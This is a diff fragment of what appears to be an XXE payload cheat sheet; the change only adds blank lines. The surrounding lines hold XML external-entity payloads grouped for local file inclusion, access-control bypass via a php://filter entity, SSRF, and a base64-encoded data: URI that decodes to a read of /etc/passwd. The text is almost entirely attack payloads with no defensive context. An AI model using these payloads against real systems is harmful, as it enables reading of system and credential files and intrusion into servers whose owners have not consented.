@@ -7,6 +7,7 @@
 
 ------
 To LFI
+
 <?xml version="1.0"?>
 <!DOCTYPE foo [  
 <!ELEMENT foo (#ANY)>
@@ -23,6 +24,7 @@ To LFI
 
 ------
 To Access Control Bypass
+
 <?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
@@ -30,6 +32,7 @@ To Access Control Bypass
 
 ------
 To SSRF
+
 <?xml version="1.0"?>
 <!DOCTYPE foo [  
 <!ELEMENT foo (#ANY)>
@@ -37,4 +40,5 @@ To SSRF
 
 ------
 Base64 Encoded
+
 <!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
